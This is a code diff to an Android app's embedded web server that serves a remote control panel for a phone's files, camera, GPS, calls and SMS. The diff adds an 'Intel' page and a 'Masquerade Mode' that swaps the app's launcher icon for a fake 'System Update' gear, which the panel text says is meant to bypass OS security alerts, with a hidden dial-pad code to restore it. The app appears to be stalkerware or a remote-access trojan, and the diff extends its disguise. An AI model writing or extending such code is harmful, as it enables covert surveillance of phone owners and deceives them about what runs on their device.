@@ -467,6 +467,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             {"/files", "Data", "&#128193;", "var(--neon-green)", "rgba(57, 255, 20, 0.05)"},
             {"/camera", "Optics", "&#128247;", "var(--danger)", "rgba(255, 49, 49, 0.05)"},
             {"/gps", "Locate", "&#128205;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
+            {"/intel", "Intel", "&#9889;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
             {"/calls", "Comms", "&#128222;", "var(--neon-yellow)", "rgba(255, 255, 0, 0.05)"},
             {"/sms", "SMS", "&#128233;", "#3498db", "rgba(52, 152, 219, 0.05)"},
             {"/mms", "MMS", "&#128444;", "#e67e22", "rgba(230, 126, 34, 0.05)"},
@@ -489,16 +490,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
         html.append("</div>");
         html.append("</div>");
-        
-        // System Log Preview (Cyber effect)
-        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
-        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">SESSION_LOGS</h3>");
-        html.append("<div style=\"background: #000; padding: 15px; border-radius: 4px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace;\">");
-        html.append("<div>[SUCCESS] Uplink established at ").append(new java.util.Date()).append("</div>");
-        html.append("<div>[INFO] Device model: ").append(android.os.Build.MODEL).append(" detected</div>");
-        html.append("<div>[INFO] Encrypted bridge active... waiting for command</div>");
-        html.append("</div>");
-        html.append("</div>");
 
         // Security Settings Card
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
@@ -508,6 +499,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_PASSWORD\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 4px; outline: none; font-family: monospace; flex-grow: 1; min-width: 200px;\">");
         html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); padding: 10px 20px; font-size: 0.7rem;\">CHANGE_PASSWORD</button>");
         html.append("</form>");
+        html.append("</div>");
+        html.append("</div>");
+        
+        // System Log Preview (Cyber effect)
+        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">SESSION_LOGS</h3>");
+        html.append("<div style=\"background: #000; padding: 15px; border-radius: 4px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<div>[SUCCESS] Uplink established at ").append(new java.util.Date()).append("</div>");
+        html.append("<div>[INFO] Device model: ").append(android.os.Build.MODEL).append(" detected</div>");
+        html.append("<div>[INFO] Encrypted bridge active... waiting for command</div>");
         html.append("</div>");
         html.append("</div>");
 
@@ -524,16 +525,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
         html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
-        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage app visibility and persistence. WARNING: Hiding the icon requires the dial-pad trigger to recover.</p>");
+        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage app visibility. <b>Masquerade Mode</b> replaces the app icon with a generic 'System Update' gear to bypass OS security alerts. Use *#1337# to restore immediately.</p>");
         
         html.append("<div style=\"display: flex; gap: 15px;\">");
-        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">TOGGLE_APP_ICON_STEALTH</button>");
+        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">TOGGLE_MASQUERADE_MODE</button>");
         html.append("</div>");
         
         html.append("<script>");
         html.append("function toggleStealth() {");
-        html.append("  if(confirm('Are you sure? This will hide the app from the drawer. Use *#1337# to recover.')) {");
-        html.append("    fetch('/stealth').then(r => r.json()).then(d => alert('Stealth status changed. Hidden: ' + d.hidden));");
+        html.append("  if(confirm('Initiate Stealth Protocol? This will change the app icon to System Update.')) {");
+        html.append("    fetch('/stealth').then(r => r.json()).then(d => {");
+        html.append("      alert(d.mode === 'masquerade' ? 'MASQUERADE_ACTIVE: Icon replaced with System Update.' : 'STEALTH_DISENGAGED: Main icon restored.');");
+        html.append("    });");
         html.append("  }");
         html.append("}");
         html.append("</script>");
@@ -2984,16 +2987,23 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response toggleStealthMode() {
         try {
-            android.content.ComponentName aliasName = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
-            int setting = context.getPackageManager().getComponentEnabledSetting(aliasName);
-            int newSetting = (setting == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) 
-                ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
-                : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
+            android.content.ComponentName fakeAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
             
-            context.getPackageManager().setComponentEnabledSetting(aliasName, newSetting, android.content.pm.PackageManager.DONT_KILL_APP);
+            int mainState = pm.getComponentEnabledSetting(mainAlias);
             
-            boolean hidden = (newSetting == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
-            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": " + hidden + "}");
+            if (mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                // Switch to Fake Icon
+                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"masquerade\", \"hidden\": true}");
+            } else {
+                // Restore Main Icon
+                pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
+            }
         } catch (Exception e) {
             return serveError("Stealth Error: " + e.getMessage());
         }
